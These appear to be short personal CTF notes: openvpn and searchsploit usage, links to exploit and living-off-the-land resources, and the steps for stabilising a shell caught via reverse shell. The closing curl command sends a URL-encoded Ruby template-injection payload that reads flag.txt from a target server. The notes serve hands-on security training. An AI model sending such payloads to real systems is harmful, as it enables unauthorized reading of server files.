# CTFs

## Openvpn

* Tool for getting acces to a VPN

{% code overflow="wrap" lineNumbers="true" %}
```bash
openvpn $ovpnfile
```
{% endcode %}

***



## Searchsploit

* Kali package for acceding to exploitDB

{% code overflow="wrap" lineNumbers="true" %}
```bash
searchsploit $Keywords
```
{% endcode %}

***



## Information Sources

* **ExploitDB:** Contains exploits that can be downloaded and used. Kali Linux comes with a preinstalled version called _Searchsploit._ [https://www.exploit-db.com/](https://www.exploit-db.com/)
* **LOLBAS:** Contain scripts, binaries and libraries for developing a Living off the Land attack. [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
* **OWASP Favicon:** Database to identify typical frameworks icons [https://wiki.owasp.org/index.php/OWASP\_favicon\_database](https://wiki.owasp.org/index.php/OWASP\_favicon\_database)
* **Hacksplaining:** [https://www.hacksplaining.com/lessons](https://www.hacksplaining.com/lessons)



## TTY Sanizitation

Executing this commands let us configure a terminal to be interactive an process keybinding as a normal bash. Very usefull when we get a external terminal for example with a reverse shell.

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>openvpn $ovpnfile
</strong>script /dev/null -c bash
ctrl +z
stty raw -echo;fg
reset
export TERM=xterm
export SHELL=bash
stty rows 24 columns 126
</code></pre>



curl 159.65.24.125:31840 -s -X POST -d 'neon=holamundo %3C%25%3D%20File.open%28%27.%2Fflag.txt%27%29.read%20%25%3E'

Payload Ruby [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby)
